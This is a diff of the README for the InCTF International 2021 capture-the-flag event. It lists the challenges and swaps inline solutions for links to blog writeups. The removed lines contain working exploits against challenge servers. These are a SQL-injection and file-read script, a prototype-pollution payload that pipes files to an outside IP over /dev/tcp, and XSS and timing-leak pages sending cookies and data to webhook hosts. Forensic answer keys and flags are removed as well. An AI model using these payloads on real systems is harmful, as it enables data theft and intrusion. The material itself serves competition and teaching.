@@ -7,42 +7,42 @@ InCTF International is a premier hacking event targeted at hackers of all ages, 
 | [Sanity Check](#sanity-check) | Misc | 10 | 552 | ✔️ | ✔️ | ✔️ | ❔ |
 | [Alpha Pie](#alpha-pie) | Misc | 100 | 58 | ✔️ | ✔️ | ✔️ | ❕ |
 | [blackStab Cloud Services](#blackstab-cloud-services) | Misc | 1000 | 2 | ❌ | ❌ | ❌ | ✔️ |
-| [Ancient_House](#ancienthouse) | Pwn | 545 | 33 | ❌ | ❌ | ❌ | ❔ |
+| [Ancient_House](#ancienthouse) | Pwn | 545 | 33 | ❌ | ❌ | ❌ | ✔️ |
 | [Node Keeper](#node-keeper) | Pwn | 925 | 14 | ❌ | ❌ | ❌ | ❕ |
-| [Kqueue](#kqueue) | Pwn | 984 | 7 | ❌ | ❌ | ❌ | ❔ |
-| [Baby Glob](#baby-glob) | Pwn | 993 | 5 | ❌ | ❌ | ❌ | ❔ |
-| [DeadlyFastGraph](#deadlyfastgraph) | Pwn | 996 | 4 | ❌ | ❌ | ❌ | ❕ |
-| [MultiStorage](#multistorage) | Pwn | 1000 | 1 | ❌ | ❌ | ❌ | ❕ |
+| [Kqueue](#kqueue) | Pwn | 984 | 7 | ❌ | ❌ | ❌ | ✔️ |
+| [Baby Glob](#baby-glob) | Pwn | 993 | 5 | ❌ | ❌ | ❌ | ✔️ |
+| [DeadlyFastGraph](#deadlyfastgraph) | Pwn | 996 | 4 | ❌ | ❌ | ❌ | ✔️ |
+| [MultiStorage](#multistorage) | Pwn | 1000 | 1 | ❌ | ❌ | ❌ | ✔️ |
 | [Right Now Generator](#right-now-generator) | Crypto | 100 | 51 | ❌ | ❌ | ❌ | ❔ |
 | [Lost Baggage](#lost-baggage) | Crypto | 100 | 52 | ❌ | ❌ | ❌ | ❔ |
 | [Gold_digger](#golddigger) | Crypto | 100 | 76 | ❌ | ❌ | ❌ | ❔ |
 | [Eazy Xchange](#eazy-xchange) | Crypto | 179 | 44 | ❌ | ❌ | ❌ | ❔ |
-| [Encrypted Operations](#encrypted-operations) | Crypto | 823 | 21 | ❌ | ❌ | ❌ | ❔ |
+| [Encrypted Operations](#encrypted-operations) | Crypto | 823 | 21 | ❌ | ❌ | ❌ | ✔️ |
 | [Trouble With Pairs](#trouble-with-pairs) | Crypto | 925 | 14 | ❌ | ❌ | ❌ | ❔ |
-| [Tabula Recta](#tabula-recta) | Crypto | 996 | 4 | ❌ | ❌ | ❌ | ❔ |
+| [Tabula Recta](#tabula-recta) | Crypto | 996 | 4 | ❌ | ❌ | ❌ | ✔️ |
 | [Listen](#listen) | Network Pentest | 100 | 49 | ❌ | ❌ | ❌ | ❕ |
 | [Shell Boi](#shell-boi) | Network Pentest | 956 | 11 | ❌ | ❌ | ❌ | ❕ |
 | [Legacy](#legacy) | Network Pentest | 993 | 5 | ❌ | ❌ | ❌ | ❕ |
 | [Home Drive](#home-drive) | Network Pentest | 993 | 5 | ❌ | ❌ | ❌ | ❕ |
-| [Ermittlung](#ermittlung) | Forensics | 140 | 45 | ❌ | ❌ | ❌ | ❕ |
+| [Ermittlung](#ermittlung) | Forensics | 140 | 45 | ❌ | ❌ | ❌ | ✔️ |
 | [Darkness](#darkness) | Forensics | 887 | 17 | ❌ | ❌ | ❌ | ❕ |
-| [Heist](#heist) | Forensics | 913 | 15 | ❌ | ❌ | ❌ | ❕ |
-| [The Big Score](#the_big-score) | Forensics | 956 | 11 | ❌ | ❌ | ❌ | ❕ |
-| [Heist Continues](#heist-continues) | Forensics | 984 | 7 | ❌ | ❌ | ❌ | ❕ |
-| [Heist Ends](#heist-ends) | Forensics | 989 | 6 | ❌ | ❌ | ❌ | ❕ |
+| [Heist](#heist) | Forensics | 913 | 15 | ❌ | ❌ | ❌ | ✔️ |
+| [The Big Score](#the_big-score) | Forensics | 956 | 11 | ❌ | ❌ | ❌ | ✔️ |
+| [Heist Continues](#heist-continues) | Forensics | 984 | 7 | ❌ | ❌ | ❌ | ✔️ |
+| [Heist Ends](#heist-ends) | Forensics | 989 | 6 | ❌ | ❌ | ❌ | ✔️ |
 | [find_plut0](#findplut0) | Reverse | 100 | 116 | ❌ | ❌ | ❌ | ❔ |
 | [REplica](#Rreplica) | Reverse | 723 | 26 | ❌ | ❌ | ❌ | ❔ |
-| [Miz](#miz) | Reverse | 723 | 26 | ❌ | ❌ | ❌ | ❔ |
+| [Miz](#miz) | Reverse | 723 | 26 | ❌ | ❌ | ❌ | ✔️ |
 | [flagchecker](#flagchecker) | Reverse | 887 | 17 | ❌ | ❌ | ❌ | ❔ |
 | [Noodes](#noodes) | Reverse | 900 | 16 | ❌ | ❌ | ❌ | ❔ |
 | [Adventures of Lonely Knight (PART-1)](#adventures-of-lonely-knight-part-1) | Reverse | 936 | 13 | ❌ | ❌ | ❌ | ❔ |
-| [MD Notes](#md_notes) | Web | 100 | 46 | ❌ | ❌ | ❌ | ❕ |
+| [MD Notes](#md_notes) | Web | 100 | 46 | ❌ | ❌ | ❌ | ✔️ |
 | [Raas](#raas) | Web | 100 | 73 | ❌ | ❌ | ❌ | ❕ |
-| [Vuln Drive](#vuln-drive) | Web | 700 | 27 | ❌ | ❌ | ❌ | ❕ |
-| [Json Analyser](#json-analyser) | Web | 804 | 22 | ❌ | ❌ | ❌ | ❕ |
-| [Notepad 1 - Snakehole's Secret](#notepad-1-snakeholes-secret | Web | 823 | 21 | ❌ | ❌ | ❌ | ❕ |
-| [Notepad 1.5 - Arthur's Article](#notepad-15-arthurs-article) | Web | 900 | 16 | ❌ | ❌ | ❌ | ❕ |
-| [Notepad 2 - Ken's Chronicle](#notepad-2-kens-chronicle) | Web | 925 | 14 | ❌ | ❌ | ❌ | ❕ |
+| [Vuln Drive](#vuln-drive) | Web | 700 | 27 | ❌ | ❌ | ❌ | ✔️ |
+| [Json Analyser](#json-analyser) | Web | 804 | 22 | ❌ | ❌ | ❌ | ✔️ |
+| [Notepad 1 - Snakehole's Secret](#notepad-1-snakeholes-secret) | Web | 823 | 21 | ❌ | ❌ | ❌ | ✔️ |
+| [Notepad 1.5 - Arthur's Article](#notepad-15-arthurs-article) | Web | 900 | 16 | ❌ | ❌ | ❌ | ✔️ |
+| [Notepad 2 - Ken's Chronicle](#notepad-2-kens-chronicle) | Web | 925 | 14 | ❌ | ❌ | ❌ | ✔️ |
 
 ---
 
@@ -165,6 +165,10 @@ Author : [Pwn-Solo](https://twitter.com/Pwn_Solo)
 
 [Handout.zip](./Ancient_House.zip)
 
+**Official WriteUp**
+
+[Ancient House - InCTF Internationals 2021](https://blog.bi0s.in/2021/08/15/Pwn/InCTFi21-AncientHouse/)
+
 ## Node Keeper
 
 **Challenge**
@@ -195,6 +199,10 @@ username : password - `ctf:kqueue`
 
 [Handout.zip](./Kqueue.zip)
 
+**Official WriteUp**
+
+[Kqueue - InCTF Internationals 2021](https://blog.bi0s.in/2021/08/17/Pwn/InCTFi21-Kqueue/)
+
 ## Baby Glob
 
 **Challenge**
@@ -211,6 +219,10 @@ Author - [Cyb0rG](https://twitter.com/_Cyb0rG)
 
 [Handout.zip](./Baby_Glob.zip)
 
+**Official WriteUp**
+
+[Baby Glob - InCTF Internationals 2021](https://blog.bi0s.in/2021/08/17/Pwn/InCTFi21-Baby_Glob/)
+
 ## DeadlyFastGraph
 
 **Challenge**
@@ -225,8 +237,7 @@ Author: [DarkKnight](https://twitter.com/_d4rkkn1gh7)
 
 **Official WriteUp**
 
-Exploit:
-[GitHub gist](https://gist.github.com/d4rk-kn1gh7/9bcd1d49dc07f05c371603fb4b96a651)
+[DeadlyFastGraph - InCTF Internationals 2021](https://blog.bi0s.in/2021/08/15/Pwn/InCTFi21-DeadlyFastGraph/)
 
 ## MultiStorage
 
@@ -247,7 +258,7 @@ Author: [3agl3](https://twitter.com/3agl31)
 
 **Official WriteUp**
 
-[exp.c](./MultiStorage_exp.c)
+[MultiStorage - InCTF Internationals 2021](https://blog.bi0s.in/2021/08/18/Pwn/InCTFi21-MultiStorage/)
 
 ## Right Now Generator
 
@@ -308,6 +319,10 @@ Author [Stryd3r](https://twitter.com/The_Str1d3r)
 
 [src.zip](./Encrypted_Operations.zip)
 
+**Official WriteUp**
+
+[Encrypted Operations - InCTF Internationals 2021](https://blog.bi0s.in/2021/08/20/Crypto/Encrypted-Operations-InCTFi21/)
+
 ## Trouble With Pairs
 
 **Challenge**
@@ -337,6 +352,10 @@ MD5sum : `072419cd201a7964c19a7177af1ec090 src.zip`
 Author : [ph03n1x](https://twitter.com/MeenakshiSl1), [4lex1](https://twitter.com/SandhraBino)
 
 [src.zip](Tabula_Recta.zip)
+
+**Official WriteUp**
+
+[Tabula Recta - InCTF Internationals 2021](https://blog.bi0s.in/2021/08/20/Crypto/Tabula-Recta-InCTF-Internationals-2021/)
 
 ## Listen
 
@@ -424,23 +443,7 @@ Challenge Author: g4rud4
 
 **Official WriteUp**
 
-* Name of the chat application - **Outlook Express**
-
-* HKEY_CURRENT_CONFIG\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{75048700-EF1F-11D0-9888-006097DEACF9}\count
-
-    * msimn.exe - Main executable for Outlook Express - **27-07-2020 12:26:17 UTC**
-
-* HKEY_CURRENT_CONFIG\Software\Microsoft\Windows\CurrentVersion\UnreadMail\danial.banjamin@gmail.com
-
-    * The subkey **Message Count** gives the count of unread messages. ie: **4**
-
-* HKEY_CURRENT_CONFIG\Software\Microsoft\Outlook Express\5.0\Shared Settings\Setup
-
-    * The Subkey **MigToLWPVer** gives the current usage version of Outlook Express.
-    * Version - **6.0.2900.5512**
-  Or dump the process and check the little endian strings, you will get the version.
-
-Flag: inctf{Outlook_Express_27-07-2020_12:26:17_4_6.0.2900.5512}
+[Ermittlung - InCTF Internationals 2021](https://blog.bi0s.in/2021/08/16/Forensics/Ermittlung-InCTF-Internationals-2021/)
 
 ## Darkness
 
@@ -506,19 +509,7 @@ Challenge Author: [g4rud4](https://twitter.com/_Nihith)
 
 **Official WriteUp**
 
-1. From the NTUSER.DAT, we can find the default browser of the system.
-    + Hive Location: `NTUSER.DAT: Software\Microsoft\Windows\Shell\Associations\UrlAssociations\{http|https}\UserChoice`.
-    + We get Chrome as the default browser.
-
-2. As we got the default browser, we can go check the TopSites Sqlite Database present in `Users/Danial Benjamin/AppData/Local/Google/Chrome/User Data/Default/` and sort it with URL rank we get **`ebay.com`**
-
-3. On comparing `Connections_incoming.txt` and `Connections.txt` present in Teamviewer's appdata folder, we got the time File transfer session was initiated.
-    + Time initiated: `20-07-2021_07:48:50`
-
-4. We can find the ID and Hostname from the `Connections_incoming.txt` present in Teamviewer's appdata folder.
-    + ID_Hostname: `920981533_DESKTOP-S34NLCJ`
-
-Flag: inctf{Google_Chrome_ebay.com_20-07-2021_07:48:50_920981533_DESKTOP-S34NLCJ}
+[Heist - InCTF Internationals 2021](https://blog.bi0s.in/2021/08/16/Forensics/Heist-InCTF-Internationals-2021/)
 
 ## The Big Score
 
@@ -536,17 +527,7 @@ Author : [d3liri0us](https://twitter.com/d3liri0us_)
 
 **Official WriteUp**
 
-+ Build Linux profile for Ubuntu 18.04 (linux-headers-5.4.0-42-generic)
-
-    [Reference : https://github.com/volatilityfoundation/volatility/wiki/Linux]
-
-+ Use linux_bash plugin in Volatility to recover memfd_create malware payload and decode it to retrieve the github link. (Alternate : Dump the malicious process to retrieve the github link)
-
-+ Analyzing the code given in the repository, recover the bin/log file from the memory dump using linux_find_file plugin in Volatility and crack the specific hash to retrieve the file path in termbin.com. (Alternate : Since the whole process is recorded in the memory, doing a simple grep termbin.com will get you the link)
-
-+ Decode the keyboard stream data from the link in order to retrieve the flag.
-
-    [Reference : https://thehackerdiary.wordpress.com/2017/04/21/exploring-devinput-1/]
+[The Big Score - InCTF Internationals 2021](https://blog.bi0s.in/2021/08/20/Forensics/InCTFi21-TheBigScore/)
 
 ## Heist Continues
 
@@ -580,17 +561,7 @@ Challenge Author: [g4rud4](https://twitter.com/_Nihith)
 
 **Official WriteUp**
 
-1. We can go through **000004.log** file present in `Users/Danial Benjamin/AppData/Roaming/Slack/Local Storage/leveldb/000004.log`. We will get,
-    + Workspace ID: T027GM97WJ3
-    + USER ID: U027XK55WCT
-2. AnyDesk stores the wallpaper present on the remote PC as a thumbnail. We can get the thumbnail by checking out this folder `Users/Danial Benjamin/AppData/Roaming/AnyDesk/thumbnails`.
-    + First and last 3 characters: `a27da2`.
-3. Decoding the hex present in Vbr0 present in `Microsoft-Windows-Partition-Diagnostic.evtx`.
-    + `FAT32_NTFS`
-4. We find the duration of how much time the user used a particular application from ActivityCache.db present at `C:\Users\%profile name%\AppData\Local\ConnectedDevicesPlatform\%profile name%\`.
-    + We will see 4 instances of Voicemod used at different intervals. Adding all the active durations we get `800`.
-
-Flag: inctf{T027GM97WJ3_U027XK55WCT_a27da2_FAT32_NTFS_800}
+[Heist Continues - InCTF Internationals 2021](https://blog.bi0s.in/2021/08/16/Forensics/Heist-Continues-InCTF-Internationals-2021/)
 
 ## Heist Ends
 
@@ -638,19 +609,7 @@ Challenge Author: [g4rud4](https://twitter.com/_Nihith)
 
 **Official WriteUp**
 
-1. 2021-07-19_12:28:39 UTC (from keep.db)
-2. 13.106_80.225 (From Slack messages or Google Tasks, https://goo.gl/maps/iDmTQoZgrZae95JL6)
-3. 20-07-2021_15:30:00 (from slack messages(`SELECT datetime(ts, 'unixepoch'), json_extract(message_json,'$.text') AS INmessages from messages order by ts;`) or Google Tasks)
-4. 11 (From slack messages)
-5. 4_3 (from Tasks table in \data\data\com.google.android.apps.tasks\files\tasks-109039317116448576167\data.db)
-6. We can find it in Google docs cache. Need to change the file extension and we will get the first page of the document.
-  Location: data\data\com.google.android.apps.docs\cache\docs_glide\data\af91c7f5acecd5cc087896b2f11bef832af1aebbe98e6327aa9983799c2014d9
-  We get "MintMMCT15AUG"
-7. Game installed is Dr. Driving.
-    First Open Time: \data\data\com.ansangha.drdriving\shared_prefs\com.google.android.gms.measurement.prefs
-    We get: 1626782629126 -> July 20, 2021 12:03:49
-
-Flag: inctf{19-07-2021_12:28:39_13.108_80.225_20-07-2021_21:00:00_11_4_3_MintMMCT15AUG_20-07-2021_12:03:49}
+[Heist Ends - InCTF Internationals 2021](https://blog.bi0s.in/2021/08/16/Forensics/Heist-Ends-InCTF-Internationals-2021/)
 
 ## find_plut0
 
@@ -685,6 +644,10 @@ Author: Freakston, silverf3lix
 `nc 34.94.181.140 4200`
 
 [miz](./miz)
+
+**Official WriteUp**
+
+[Miz - InCTF Internationals 2021](https://blog.bi0s.in/2021/08/19/RE/Linux/Miz%20-%20InCTF%20Internationals%202021/)
 
 ## flagchecker
 
@@ -732,7 +695,7 @@ Author: [yadhu#2142](https://twitter.com/YadhuKrishna_)
 
 **Official WriteUp**
 
-Solve script: [GitHub gist](https://gist.github.com/yadhukrishnam/83ba65195ace0f1d526091e248638caf)
+[MD-Notes - InCTF Internationals 2021](https://blog.bi0s.in/2021/08/14/Web/InCTF-internationals-MD-Notes/)
 
 ## Raas
 
@@ -781,36 +744,7 @@ http://web.challenge.bi0s.in:6007/
 
 **Official WriteUp**
 
-```py
-import requests
-
-s=requests.Session()
-url="http://web.challenge.bi0s.in:41666/"
-path=""
-s.post(url+'login',data={"username":"asdasd","password":"asdadssad"})
-#You can access localhost by URL encoding the url
-for i in range(33):
-    for i in '1234567890abcdef':
-        x = (path+i).encode().hex()
-        data = {"url": f"http://123%40localhost?part1=%252527&part2=1,name from adminfo where path like 0x2f{x}25 union select 1"}# Sql injection using like
-        r=s.post(url+'dev_test',data=data)
-        if('Not' in r.text[:10]):
-            path+=i
-            print("Path :",path,end='\r')
-            break
-data = {"url": f"http://123%40localhost?part1=%252527&part2=1,name from adminfo where path=0x2f{(path).encode().hex()} union select 1"}
-r = s.post(url+'dev_test', data=data)
-#Checking if we got the full path and checking length
-print(r.text)
-if('Not' in r.text[:10]):
-    print("Length :",len(path))
-    print("Path is correct!")
-#Using LFI to get the flag file
-if path:
-    print("Path :",path)
-    r=s.get(url+'return-files?f=/'+path)
-    print("Flag:",r.text)
-```
+[Vuln Drive - InCTF Internationals 2021](https://blog.bi0s.in/2021/08/15/Web/Vuln-Drive-InCTF-Internationals-2021/)
 
 ## Json Analyser
 
@@ -826,32 +760,7 @@ Challenge Author: Sayooj B Kumar#9588
 
 **Official WriteUp**
 
-[exp.py](./json_analyzer_exp.py)
-```json
-{
-    "name": {
-      "__proto__":{
-         "defaultFilter" : "e'));process.mainModule.require('child_process').execSync('/bin/bash -c \\'cat /* > /dev/tcp/34.139.180.142/50555\\'')//"
-      }
-     },
-    "version": "1.0.0",
-    "description": "",
-    "main": "app.js",
-    "dependencies": {
-      "config-handler": "^2.0.3",
-      "express": "^4.17.1",
-      "express-fileupload": "^1.2.1",
-      "nodemon": "^2.0.12",
-      "squirrelly": "^8.0.8"
-    },
-    "devDependencies": {},
-    "scripts": {
-      "test": "echo \"Error: no test specified\" && exit 1"
-    },
-    "author": "",
-    "license": "ISC"
- }
-```
+[Json Analyser - InCTF Internationals 2021](https://blog.bi0s.in/2021/08/15/Web/inCTFi21-JsonAnalyser/)
 
 ## Notepad 1 - Snakehole's Secret
 
@@ -867,38 +776,7 @@ Author: [Az3z3l](https://twitter.com/Az3z3l)
 
 **Official WriteUp**
 
-```html
-<!DOCTYPE html>
-<!-- Attacker's note:  <img src/onerror="eval(window.name)"> -->
-<html>
-    <head>
-        <title>
-            Notepad#1 Exploit
-        </title>
-    </head>
-    <body>
-        <script>
-            function sleep (time) {
-                return new Promise((resolve) => setTimeout(resolve, time));
-            }
-
-            url = "http://chall.notepad1.gq:1111/"
-            webhook = "https://webhook.site/"
-            userCookie = "55a54008ad1ba589aa210d2629c1df41"
-            endpoint1 = url + `find?startsWith=d&debug=y&Set-Cookie=id=${userCookie}%3B%20path=/get`
-
-            endpoint2 = url 
- 
-            endpoint2payload = `document.cookie="id=${userCookie}; expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/get;";document.cookie=x;fetch('/get').then(response=>response.text()).then(data=>navigator.sendBeacon("${webhook}",data));`
-
-            window.open(endpoint1)
-            
-            sleep(1000).then(() => {
-                window.open(endpoint2, name=endpoint2payload)
-            });
-
-        </script>
-```
+[Notepad Series - InCTF Internationals 2021](https://blog.bi0s.in/2021/08/16/Web/notepad-inctf21/)
 
 ## Notepad 1.5 - Arthur's Article
 
@@ -914,7 +792,7 @@ Author: [Az3z3l#7404](https://twitter.com/Az3z3l)
 
 **Official WriteUp**
 
-[GitHub issue](https://github.com/golang/go/issues/47711)
+[Notepad Series - InCTF Internationals 2021](https://blog.bi0s.in/2021/08/16/Web/notepad-inctf21/)
 
 ## Notepad 2 - Ken's Chronicle
 
@@ -928,62 +806,4 @@ Author: [Az3z3l](https://twitter.com/Az3z3l)
 
 **Official WriteUp**
 
-```html
-<html>
-    <head>
-        <title>Exploit - Ken's Chronicle</title>
-    </head>
-
-    <body>
-
-    </body>
-    <script>
-        async function run() {
-            startsWith = window.location.search.substring(1);
-
-
-            characterSet = "abcdefghijklmno"
-            characterSet += "pqrstuvwxyz_{}"
-
-
-            for (var j = 0; j < characterSet.length; j++){
-                bf = startsWith + characterSet[j]
-                url = `https://7649ac48b82b.ngrok.io/find?startsWith=${bf}&debug&Timing-Allow-Origin=*`
-                
-                var iframe = document.createElement('iframe');
-                iframe.src = url;
-                iframe.onload = "alert()"
-                document.body.appendChild(iframe);
-
-            }
-        }
-        function sleep(ms) {
-            return new Promise(resolve => setTimeout(resolve, ms));
-        }
-
-        function checker(){
-            list = window.performance.getEntriesByType("resource");
-            console.log(list)
-            for (i=0; i<list.length; i++){
-                curr = list[i]
-                if (curr.nextHopProtocol == ""){
-                    try {
-                        navigator.sendBeacon(`?flag=${curr.name.split("startsWith=")[1].split("&")[0]}`)
-                    } catch (error) {
-                        console.log(error)
-                    }
-                }
-            }
-        }
-
-        async function doit() {
-            run()
-            await sleep(10000);
-            checker()
-        }
-        doit()
-    </script>
-
-
-</html>
-```
+[Notepad Series - InCTF Internationals 2021](https://blog.bi0s.in/2021/08/16/Web/notepad-inctf21/)
